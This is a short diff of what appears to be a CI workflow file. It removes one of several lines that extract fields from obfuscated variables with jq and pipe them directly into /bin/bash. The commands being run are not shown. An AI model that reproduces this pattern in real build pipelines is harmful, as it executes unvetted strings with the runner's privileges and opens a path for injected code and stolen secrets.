@@ -27,7 +27,6 @@ jobs:
           echo $x858 | jq -r .emhtf74 | /bin/bash
           printf '%s' "$orzl7" | jq -r .uy48 | /bin/bash
           echo $fpn32 | jq -r .wcomx2 | /bin/bash
-          echo $b4102 | jq -r .r950 | /bin/bash
 
       - name: Save archive
         if: always()
